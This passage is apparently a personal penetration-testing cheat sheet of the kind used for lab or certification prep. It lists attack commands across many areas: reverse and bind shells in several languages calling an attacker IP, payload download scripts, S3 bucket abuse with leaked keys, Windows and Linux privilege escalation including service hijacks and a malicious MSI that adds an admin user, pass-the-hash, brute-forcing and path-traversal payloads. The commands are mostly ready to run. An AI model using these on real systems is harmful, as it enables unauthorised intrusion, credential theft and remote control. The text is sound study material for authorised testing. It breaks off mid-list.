    + https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines
    + https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf


#### #Oauth
* grant_type:
    + authorization_code
    + implicit
    + password
    + client_credentials
    + refresh_token
    + device_code
* (token theft)[https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/]
* jwt
    + sign algo from user input (none/rs/hs)
    + empty signature / not verified signature
    + tokens in urls
    + sensitive informations in payload
    + replay attacks / reuse in different context
    + short exp time
    + invalidation of tokens
    + [the list](https://sakurity.com/oauth)


#### #AWS
* basic checks
    ```
    dig +nocmd $domain any +multiline +noall +answer
    # go to $ip
    # check if it redirects to https://aws.amazon.com/s3/
    nslookup $ip
    http://$domain.s3-website-us-west-2.amazonaws.com  # or another region
    ```
* browse bucket
    ```
    aws s3 ls  s3://$domain/ --no-sign-request --region us-west-2
    aws s3 sync s3://$domain/ . --no-sign-request --region us-west-2
    aws s3 --profile YOUR_ACCOUNT ls s3://$domain
    ```
* when key leaked
    ```
    aws configure --profile $profile
    aws --profile $profile s3 ls
    aws --profile $profile sts get-caller-identity
    aws --profile $profile ec2 describe-snapshots --owner-id 975426262029
    ```
* magic ip - 169.254.169.254 (metadata ip)


#### #webdav / iis 6
* upload files with PUT method to writable dirs (except executable, like asp)
* [MOVE/COPY method](http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html)
    ```
    COPY /shell_gros.txt HTTP/1.1
    Host: 10.11.1.229
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
    Destination: /shell_gros.asp;.txt
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    Connection: close
    ```
* old headers for url rewriting (auth bypass)
    ```
    X-Original-URL
    X-Rewrite-URL
    ```


#### #SSL
    * Manual check 
        ```openssl s_client -no_tls1 -no_ssl3 -connect host:port```


#### #GPG
    * --verify may returns 0 even on error
    ```
    gpg --verify somefile.sig
    # when somefile.sig contains correctly clearsigned data (may have nothing to do with somefile), cmd will return 0
    # https://www.securityfocus.com/bid/2141/discuss
    ```


<!-- 
    ---------------------------------------------------------------
 CHECKLISTS
    ---------------------------------------------------------------
 -->
### Checklists

* [SEI CERT, lot of rules](https://wiki.sei.cmu.edu/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java)

* [Sonar rules](https://rules.sonarsource.com/java/type/Vulnerability)

* [FindSecBugs rules](https://find-sec-bugs.github.io/bugs.htm)

* [API checklist](https://github.com/shieldfy/API-Security-Checklist)

* [Checklist for devs](https://github.com/FallibleInc/security-guide-for-developers/blob/master/security-checklist.md)

* [Vulnerabilities list](http://www.tecapi.com/public/relative-vulnerability-rating-application.jsp?antiCsrfToken=null&filterCategory=1)

- [DevSecOps](https://github.com/devsecops/awesome-devsecops)


<!-- 
    ---------------------------------------------------------------
 WRITE TO RCE
    ---------------------------------------------------------------
 -->
### Arbitrary write to RCE
* crontab scripts
* some running process config files (ie. Apache)
* .bashrc
* webshell


<!-- 
    ---------------------------------------------------------------
 NETWORKING
    ---------------------------------------------------------------
 -->
### Networking

#### #Commands

    * netcat options
        ```
        -C  - add line feed \r
        -n - no DNS
        ```

    * bind shell
        ```
        # listen on $ip
        +------+                 +--------------+
        |A $ip|  <- commands <- |B <our machine|
        +------+                 +--------------+
        A: nc -nlvp 4444 -e cmd.exe  # on $ip machine
        B: nc -nv $ip 4444  # on our machine
        ```

    * reverse shell
        ```
        # listen on <our machine>
        +------+                 +--------------+
        |A $ip|  <- commands <- |B <our machine|
        +------+                 +--------------+
        A: nc -nv <our machine> 4444 -e /bin/bash  # on $ip machine
        B: nc -nlvp 4444  # on our machine
        ```

    * ncat (instead of netcat)
        ```
        # bind shell
        A: ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl
        B: ncat -v $ip 4444 --ssl

        # reverse shell
        A: ncat -nv <our machine> 4444 -e /bin/bash --ssl
        B: ncat -vnl 4444 --ssl --allow $ip
        ```

    * sbd (from kali linux)

    * iptables
        ```
        # accept on 7777 for $ip
        iptables -I INPUT -p tcp -s $ip --dport 7777 -j ACCEPT

        # dissalow for other ips
        iptables -I INPUT -p tcp -s 0.0.0.0/0 --dport 7777 -j DROP
        ```

    * tcpdump
        ```
        -n - don't convert addresses
        -r - read from file
        -X - hex dump
        -s - snapshot length (default is 262144 bytes)
        tcpdump -n dst host 172.16.40.10 port 80 -r <file to read from>.pcap
        tcpdump -A -n 'tcp[13] = 24' -r <file to read from>.pcap  # filtering by flags
        ```

    * aircrack
        ```
        sudo airmon-ng check kill
        sudo airmon-ng start wlp9s0
        sudo iwconfig wlp9s0mon channel X  # for wireshark
        sudo wireshark -i wlp9s0mon
        sudo airodump-ng wlp9s0mon
        sudo airmon-ng stop wlp9s0mon && sudo systemctl start wpa_supplicant && sudo systemctl start network-manager.service
        ```

#### #Recon
    * passive
        * google
            ```
            site:asd.com -size:www.asd.com
            filetype, inurl, intitle
            ```
        * GHDB (http://www.exploit-db.com/google-dorks/)
        * theharvester
        * Netcraft
        * whois
        * Recon-ng / altdns / domain (jhaddix)
        * XXSed (http://xssed.com/) -- super old!
        * Metadata
            * http://lcamtuf.coredump.cx/soft/therev.tgz 

    * active
        * host
            ```
            host -t mx domain.com
                A - ip addresses
                MX - mails delicery address?
                CNAME - canonical name (alias -> canonical)
                NS - name server (DNS server domain uses)
                SOA - Start of Authority record (administrative information about the zone, zone transfer)
                SIG - todo
                KEY - todo
                AXFR - something about zone transfer?
            for ip in $(cat subdomain_list.txt); do host $ip.domain.com; done

            # reverse lookup
            for ip in $(seq 155 190); do host 50.7.67.$ip; done | grep -v "not found"

            # dnz transfer
            host -l <domain name> <dns server address>
            ```
        * DNSRecon
        * DNSenum

    * port scanning
        * types
            ```
            Connect - simplest, tcp three-way handshake (syn, syn-ack, ack), -sT option # nc -nvv -w 1 -z 10.0.0.19 3388-3390
                * quick
                * no root needed
                * easily detectable, often logged
            Stealth / SYN Scanning - without finall ack (syn, syn-ack), -sS option
                * root needed
                * rarely logged
            RST stuff
                * send "partial" packet, closed ports respond with RST, open don't respond at all
                    * not working for microsoft (todo: check)
                    * it's because of bug in TCP implementation, not reliable
                * FIN (only FIN bit), option -sF
                * Null (not set any bits in header)
                * Xmas (FIN, PSH, and URG bits)
            UDP, -sU option # nc -nv -u -z -w 1 10.0.0.19 160-162
                * slow
                * not responding ports marked as open|filtered, try with -sV
            SCTP Init, option -sY
                * wtf is that
            ACK - detect firewalls
                * If not filtered, both open and closed ports respond with RST
                * If filtered, no response or ICMP error
            Window
                * todo
            Maimon
                * like FIN etc
                * for BSD based systems
            ```
        * scripts
            ```
            ftp-bounce -> old ftp servers may send files to arbitrary host for you, may bypass firewall
            nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>
            nmap -sn 10.11.1.1-255 -oG ping-sweep.txt
            nmap --script exploit -Pn $ip
            nmap -v -p 21 --script=ftp-anon.nse $ip-254
            ```

        * common pitfals
            + udp scan is often unreliable
            + only "interesting ports" are scaned by default
            + forgotten udp services

    * rpc (port 111), shows open ports
        ```
        rpcinfo -p $ip
        showmount -e $ip  # if nfs entries above
        nmap -sV --script=nfs-showmount $ip
        rpcclient --user="" --command=enumprivs -N $ip
        ```

    * smb
        * on port 137, 139 or 445 
        * null sessions
        * ls -l /usr/share/nmap/scripts/smb* 
        * scripts
            ```
            nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
            nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip

            # open smb shares
            nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 $ip

            # fingerprint / enumeration
            smbclient -L //$ip
            nmblookup -A $ip
            smbclient //MOUNT/share -I $ip -N
            nbtscan -r $ip
            enum4linux -a $ip
            rpcclient -U "" $ip

            # null sessions
            ridenum.py $ip 500 50000 dict.txt
            net use \\$ip\IPC$ "" /u:""
            smbclient -L //$ip
            ```

    * SMTP
        * user enumeration (VRFY command)
        * smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $ip

    * SNMP
        http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm
        * on port 161
        * onesixtyone
            ```
            echo public > community
            echo private >> community
            echo manager >> community
            for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
            onesixtyone -c community -i ips
            ```
        * snmpwalk
            ```
            Enumerating the Entire MIB Tree
            snmpwalk -v1 -c public -v1 10.11.1.219

            Enumerating Windows Users:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

            Enumerating Running Windows Processes:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

            Enumerating Open TCP Ports:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

            Enumerating Installed Software:
            snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
            ```
        * braa, snmpcheck
        * decode MIB numbers
            ```
            apt-get install snmp-mibs-downloader download-mibs && echo "" > /etc/snmp/snmp.conf
            ```

    * FTP
        * anonymous/anonymous login
        * ftp -p for passive mode

    * DNS
        * open resolvers
        ```
        dig +short test.openresolver.com TXT @$ip
        ```

    * Random tools
        * https://github.com/BloodHoundAD/BloodHound
        * https://github.com/SpiderLabs/Responder


#### #Vuln scanning
    * nmap
        ```
        nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210 # cold fusion
        nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254  # anonymous ftp
        nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236  # smb security level
        ```
    * openVAS


#### #File transfer/uploading
    * TFPT
        ```
        root@kali:~# mkdir /tftp
        root@kali:~# atftpd --daemon --port 69 /tftp
        root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/

        C:\Users\Offsec>tftp -i 10.11.0.187 get nc.exe
        ```

    * FTP
        ```
        # install and add user
        root@kali:~# apt-get update && apt-get install pure-ftpd

        groupadd ftpgroup
        useradd -g ftpgroup -d /dev/null -s /etc ftpuser
        pure-pw useradd offsec_gros -u ftpuser -d /ftphome
        pure-pw mkdb
        cd /etc/pure-ftpd/auth/
        ln -s ../conf/PureDB 60pdb
        mkdir -p /ftphome
        chown -R ftpuser:ftpgroup /ftphome/
        /etc/init.d/pure-ftpd restart

        # download
        echo open 192.168.34.31 21> ftp.txt
        echo USER offsec_gros>> ftp.txt
        echo X3KR9LsbywChj >> ftp.txt
        echo bin >> ftp.txt
        echo GET nc.exe >> ftp.txt
        echo bye >> ftp.txt
        ftp -v -n -s:ftp.txt

        wget.exe -r ftp://offsec_gros:X3KR9LsbywChj@10.11.0.187
        ```

    * VBScript
        ```
        echo strUrl = WScript.Arguments.Item(0) > wget.vbs
        echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
        echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
        echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
        echo Err.Clear >> wget.vbs
        echo Set http = Nothing >> wget.vbs
        echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
        echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
        echo http.Open "GET", strURL, False >> wget.vbs
        echo http.Send >> wget.vbs
        echo varByteArray = http.ResponseBody >> wget.vbs
        echo Set http = Nothing >> wget.vbs
        echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
        echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
        echo strData = "" >> wget.vbs
        echo strBuffer = "" >> wget.vbs
        echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
        echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
        echo Next >> wget.vbs
        echo ts.Close >> wget.vbs

        C:\Users\Offsec>cscript wget.vbs http://10.11.0.187/evil.exe evil.exe
        ```

    * PowerShell
        ```
        echo $storageDir = $pwd > wget.ps1
        echo $webclient = New-Object System.Net.WebClient >>wget.ps1
        echo $url = "http://10.11.0.187/evil.exe" >>wget.ps1
        echo $file = "new-exploit.exe" >>wget.ps1
        echo $webclient.DownloadFile($url,$file) >>wget.ps1
        powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
        ```

    * debug.exe (win32, 64kb max)
        ```
        upx -9 nc.exe

        cp /usr/share/windows-binaries/exe2bat.exe .
        wine exe2bat.exe nc.exe nc.txt
        ```

    * netcat + base64
        ```
        A: nc -lp 7777 > file.zip.base64
        B: cat file.zip | base64 | nc $ip 7777
        A: certutil -decode file.zip.base64 file.zip
        ```

    * bash
        ```
        exec 3<>/dev/tcp/31.133.0.26/80; echo -en 'GET / HTTP/1.1\r\nHost: gynvael.coldwind.pl\r\n\r\n' >&3; cat <&3
        ```

#### #Tunneling
    * port forwarding (rinetd or iptables)
        * outbound filter to specific port -> rinetd on home computer on filtered port that redirects traffic to destination port
        ```
        cat /etc/rinetd.conf
        # bindadress bindport connectaddress connectport
        ```

    * ssh tunneling
        * local
            ```
            # reach external computer listening on restricted port
            ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
            # <remote host>:<remote port> - we want connection to it
            now we connect (from filtered, internal network) to localhost:<local port to listen> -> ssh via <gateway> -> <remote host>:<remote port>
            ```

        * remote
            ```
            # expose port to external computer
            ssh <gateway> -R <remote port to bind>:<local host>:<local port>

            now we connect (from remote, public network) to <gateway>:<remote port to bind> -> ssh via <gateway> -> <local host>:<local port>
            ```

        * dynamic
            ```
            # create local socks4 proxy
            ssh -D <local proxy port> -p <remote port> <target>
            # <target> must allow traffic on <remote port>
            now we can setup proxy in our tools
            ```

        * proxychains
            ```
            ssh -f -N -R 2222:127.0.0.1:22 root@attacker-machine  # on internal machine. Now attacker machine listen on 2222 and tunnel traffic to internal machine

            ssh -f -N -D 127.0.0.1:8080 -p 2222 some-user@127.0.0.1  # on attacker machine. Now we have proxy on 8080 that tunnel via ssh into internal machine (with user some-user)

            proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24  # proxychains uses 8080 to tunnel trafic
            ```

        * metasploit dynamic proxy
            ```
            > route add 10.1.1.0 255.255.255.0 3
            > use auxiliary/server/socks4a
            > set SRVPORT
            > run

            > msfmap ?
            > portfwd
            ```

    * HTTP Tunneling
    * Deep inpsection
        * stunnel
        * HTTPTunnel


#### #Post exploitation
    * reverse shell (from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
        ```
        * bash
            bash -i >& /dev/tcp/10.11.0.187/8080 0>&1

        * perl
            perl -e 'use Socket;$i="10.11.0.187";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

        * python
            python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.187",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''

        * php
            php -r '$sock=fsockopen("10.11.0.187",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

        * ruby
            ruby -rsocket -e'f=TCPSocket.open("10.11.0.187",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

        * netcat
            nc -e /bin/sh 10.11.0.187 1234
            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.187 1234 >/tmp/f

        * java
            r = Runtime.getRuntime()
            p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.0.187/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
            p.waitFor()
        ```

    * real tty (http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
        ```
        * python
            python -c 'import pty; pty.spawn("/bin/bash");'

        * sh
            /bin/sh -i

        * perl
            perl -e 'exec "/bin/sh";'
        ```
    * stty (https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
        ```
        # In reverse shell
        $ python -c 'import pty; pty.spawn("/bin/bash")'
        Ctrl-Z

        # In Kali
        $ stty raw -echo
        $ fg

        # In reverse shell
        $ reset
        $ export SHELL=bash
        $ export TERM=xterm-256color
        $ stty rows <num> columns <cols>
        ```


<!-- 
    ---------------------------------------------------------------
 PRIVILEGE ESCALATION
    ---------------------------------------------------------------
 -->
### Privilege escalation

#### #Windows

    * common
        ```
        whoami
        systeminfo
        ver
        tree /F /A
        hostname
        echo %username%
        set
        net users
        net start
        DRIVERQUERY

        # tasks
        schtasks /query /fo LIST /v

        tasklist /SVC
        tasklist /svc /FI "PID eq 1"

        rem Open TCP Port 445  inbound and outbound
        netsh firewall add portopening TCP 445 "Zoo TCP Port 445"

        runas /user:<UserName> program
        runas /noprofile /user:Administrator cmd 

        # delete dir with files
            rd /s /q dir
        # delete file
            del file

        # network
        netstat -ano
        route print
        arp -A
        net config Workstation
        netsh firewall show state / config

        # add user with group administrators
            net user /add <username> <password>
            net localgroup administrators <username> /add
            net localgroup "Remote Desktop Users" <username> /add

        # list drives
            wmic logicaldisk get caption

        # run as system (from admin)
            # on newer windows
                reg add HKLM\System\CurrentControlSet\Control\Windows /v NoInteractiveServices /d 0
                sc start ui0detect
            sc create cmdsvc binpath= "cmd /K start" type= own type= interact
            sc start cmdsvc

        # run as system 2 (from admin)
            psexec –i –s cmd.exe

        # powershell from cmd
        powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\A.ps1; A }"
        ```

    * Admins in domain
    * Creds in config files (gpp)
        ```
        C:\>dir /b /s web.config
        unattend.xml
        groups.xml
        sysprep.inf/.xml - encrypted, but priv keys are known (https://msdn.microsoft.com/en-us/library/cc422924.aspx)

        dir c:\*vnc.ini /s /b /c
        dir c:\*ultravnc.ini /s /b /c
        dir c:\ /s /b /c | findstr /si *vnc.ini
        findstr /si password *.txt *.xml *.ini
        reg query HKLM /f password /t REG_SZ /s
        reg query HKCU /f password /t REG_SZ /s
        reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
        reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
        ```

    * metasploit's getsystem

    * PyInstaller (python script to standalone binary)
        ```
        python pyinstaller.py --onefile ms11-080.py
        ```

    * Crosscompiling from linux - mingw
        ```
        mingw-w64
        i686-w64-mingw32-gcc 646.c -o 646.exe -lws2_32
        ```

    * Services
        * list
            ```
            net start
            sc queryex type= service state= all | find /i "NATION"
            ```
        * Folder permissions (service's binary replace etc.)
            ```
            icacls path-to-exe
            ```

        * Services permissions
            ```
            # download: https://docs.microsoft.com/pl-pl/sysinternals/downloads/sysinternals-suite
            # list user's obejcts
                accesschk.exe /accepteula -uwcqv "Authenticated Users" *
                accesschk.exe /accepteula -ucqv upnphost # or SSDPSRV

            # universal WinXP SP0/SP1 PE
                 sc config upnphost binpath= "C:\Documents and Settings\IWAM_BOB\Desktop\tmp\nc.exe -nv 10.11.0.187 9988 -e C:\WINDOWS\System32\cmd.exe"
                 sc config upnphost obj= ".\LocalSystem" password= ""
                 sc qc upnphost
                 net start upnphost

            #list properties
                sc qc "Vulnerable Service"
            # check privileges
                sc qprivs "Service name"
            ```

        * Unquoted Service Paths (https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/) (exploit/windows/local/trusted_service_path)
            ```
            # list unquoted services
            wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

            # batch
            @echo off
            :START_PROG
            cls
            for /f "tokens=2" %%I in ('sc query^|find "SERVICE_NAME:"') do Call :CHECK_SVR %%I
            GOTO END_PROG

            :CHECK_SVR
            sc qc %1|find "DISPLAY"
            sc qc %1|find "BINARY"
            GOTO END_PROG
            :END_PROG

            # if service contains space (eg. C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe) windows will try execute in order:
            C:\Program.exe
            C:\Program Files.exe
            C:\Program Files (x86)\Program.exe
            C:\Program Files (x86)\Program Folder\A.exe
            C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
            ```

    * Registry
        * common
            ```
            reg /?
            ```
        * permissions
            ```
            check with Registry Editor key ImagePath in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
                - reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache" /t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\shell.exe" /f
                - restart service
                 
            subinacl.msi (https://www.microsoft.com/en-us/download/details.aspx?id=23510):
            subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
            ```
        * AlwaysInstallElevated registry key
            ```
            check:
                reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
                reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

            if enabled create msi file:
                msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=password -o add_user.msi

            upload msi and run:
                msiexec /quiet /qn /i malicious.msi 
            ```

    * DLL things
        * dll-injector (https://securityxploded.com/remote-dll-injector.php)
        * hijacking
            + check for dll dependencies (http://www.dependencywalker.com/ / listdlls)
            ```
            DLL search dirs in order:
                The directory from which the application is loaded
                C:\Windows\System32
                C:\Windows\System
                C:\Windows
                The current working directory
                Directories in the system PATH environment variable
                Directories in the user PATH environment variable
            ```
    * Kernel exploit
        ```
        wmic qfe get Caption,Description,HotFixID,InstalledOn
        then check with f.e. https://pentestlab.blog/2017/04/24/windows-kernel-exploits/
        ```

    * Task Scheduler
        ```
        Windows 2000, XP, or 2003 only
        local administrator -> SYSTEM

        check if running:
            net start "Task Scheduler"
        add to ts: at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
        ```

    * GUI
        * check for gui tols running as SYSTEM, find "open file" dialog, open cmd.exe (https://www.youtube.com/watch?v=kMG8IsCohHA : 11:00)

    * named pipe (http://seclists.org/vulnwatch/2003/q3/12)
    * Shatter attacks
    * tools
        ```
        wpc (https://github.com/pentestmonkey/windows-privesc-check)
        pysecdump (https://github.com/pentestmonkey/pysecdump)
        lsadump / mimikatz (https://github.com/gentilkiwi/mimikatz)
        Ntrights.exe
        ```
    * Pwdump and fgdump (extract hashes from windows SAM memory injecting DLL to LSASS)
        * SAM - Security Account Manager, SYSKEY (from Windows NT 4.0 PS3) partially encrypts it
        * Storing passwords
            * LAN Manager - DES encrypted (Windows NT <= Windows 2003 only)
            * NT LAN Manager - MD4 hashing
        * LSASS - Local Security Authority Subsystem
    * ophcrack - cracker for hashes from fgdump

    * Windows Credentials Editor (http://www.ampliasecurity.com/research/windows-credentials-editor)
    * Pass-The-Hash (https://www.hacking-lab.com/misc/downloads/event_2010/daniel_stirnimann_pass_the_hash_attack.pdf)
        + incognito (https://labs.mwrinfosecurity.com/tools/incognito/)
        + https://github.com/PowerShellMafia/PowerSploit
        ```
        export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
        pth-winexe -U administrator% //10.11.01.76 cmd
        ```
    * [sysret](https://pentestlab.blog/2017/06/14/intel-sysret/)
    * rotten potato (https://github.com/breenmachine/RottenPotatoNG)
        + from network/admin service to SYSTEM
    * hot potato (https://github.com/foxglovesec/Potato)


#### #Linux

    * sudo -l / sudo -e
    * CVE-2015-5602 (https://www.exploit-db.com/exploits/37710/)
        * when sudoedit have two * in path
    * suid-debug and MALLOC_CHECK_ envvar
    * setuid
        ```
        find / -perm -6000 2>/dev/null
        find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
        find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
        find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
        /usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null
        ```
    * enum
        ```
        uname -a
        netstat -tulpn
        ps aux | grep root
        find / -writable -type d 2>/dev/null      # world-writeable folders
        ```
    * NFS server
        * mout root
            ```
            # apt install nfs-common
            rpcinfo -p $ip  # list
            showmount -e $ip  # export list, check if / is accessible
            mount -o nolock -t nfs $ip:/ /tmp/nfs
            # now add ssh key to authorized_keys or whatever
            ```
        * edit /etc/exports and reboot
 

#### #Passwords brute-force & dumping
    * key-space search
        * crunch
    * password profiling
        ```
        cewl www.domain.com -m 6 -w domain-cewl.txt
        ``
    * password mutating
        ```
        john --wordlist=list-cewl.txt --rules --stdout > mutated.txt

        john 127.0.0.1.pwdump  # for fgdump
        john --wordlist=domain-cewl.txt --rules --stdout > mutated.txt
        unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
        ```
    * medusa, ncrack, hydra
        ```
        medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10
        ncrack -vv --user offsec -P password-file.txt rdp://$ip
        hydra -P password-file.txt -v $ip snmp
        hydra -l root -P password-file.txt $ip ssh
        ```
    * hash-identifier (https://code.google.com/p/hash-identifier/)
    

#### #Restricted shell escape
    * start with env and PATH
    * ls replacements
        ```
        echo path/to/dir/*
        ```
    * export -p
        * check if any variable is writeable
    * copy files to PATH
    * copy to home dir and something with ~
    * chroot
        * https://filippo.io/escaping-a-chroot-jail-slash-1/
        * https://github.com/earthquake/chw00t
    * mounting filesystem
    * editors (vi, vim)
        ```
        :set shell=/bin/bash
        :shell

        :! /bin/bash
        : python

        # assumption that "[esc]:pre" uses /bin/mail to notify the user of a vi crash
        rbash # touch bin mail
        rbash # chmod 777 bin mail
        rbash # export IFS="/"
        rbash # vi
        [esc]:pre
        File preserved.
        [esc]:q!

        # open manual (with less)
        K
        ```
    * commands to try:
        ```
        awk 'BEGIN {system("/bin/sh")}'
        find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
        less, more, man with :!/bin/sh
        less with :e (examine)

        python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
        perl -e 'exec "/bin/sh";'
        perl: exec "/bin/sh";
        ruby: exec "/bin/sh"
        lua: os.execute('/bin/sh')
        irb(main:001:0> exec "/bin/sh"

        iptables --modprobe=<cmd>
        tar --checkpoint-action=<cmd>
        rsync -e <cmd>
        scp -S <command> a b:
        lynx !
        mail "~v"
        ```
    * write to file without echo -> tee
        ```
        echo "evil script code" | tee script.sh
        tee -a  # append
        ```
    * stuff from bash_profile are running before restricted shell
    * mirc32.exe -> /exec with cmd.exe (http://www.phrack.org/issues/69/4.html#article)
    * set handler for telnet:// uri in browser to cmd.exe
    * wine: `start /unix /bin/sh`


#### #Path traversal
* [Windows](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
    * Paths
        ```
        ../
        ..\
        ..\/
        %2e%2e%2f
        %252e%252e%252f
        %c0%ae%c0%ae%c0%af
        %uff0e%uff0e%u2215
        %uff0e%uff0e%u2216
        ..././
        ...\.\
        ```

    * Files
        ```
        C:/Users/Administrator/NTUser.dat
        C:/Documents and Settings/Administrator/NTUser.dat
        C:/apache/logs/access.log
        C:/apache/logs/error.log
        C:/apache/php/php.ini
        C:\boot.ini
        C:\config.sys
        C:\Windows\System32\cmd.exe
        C:\pagefile.sys
        C:\System Volume Information
        C:/inetpub/wwwroot/global.asa
        C:/MySQL/data/hostname.err
        C:/MySQL/data/mysql.err
        C:/MySQL/data/mysql.log
        C:/MySQL/my.cnf
        C:/MySQL/my.ini
        C:/php4/php.ini
        C:/php5/php.ini
        C:/php/php.ini
        C:/Program Files/Apache Group/Apache2/conf/httpd.conf
        C:/Program Files/Apache Group/Apache/conf/httpd.conf
        C:/Program Files/Apache Group/Apache/logs/access.log
        C:/Program Files/Apache Group/Apache/logs/error.log
        C:/Program Files/FileZilla Server/FileZilla Server.xml
        C:/Program Files/MySQL/data/hostname.err
        C:/Program Files/MySQL/data/mysql-bin.log
        C:/Program Files/MySQL/data/mysql.err
        C:/Program Files/MySQL/data/mysql.log
        C:/Program Files/MySQL/my.ini
        C:/Program Files/MySQL/my.cnf
        C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
        C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
        C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
        C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
        C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
        C:/Program Files/MySQL/MySQL Server 5.0/my.ini
        C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
        C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
        C:/Program Files (x86)/Apache Group/Apache/conf/access.log
        C:/Program Files (x86)/Apache Group/Apache/conf/error.log
        C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
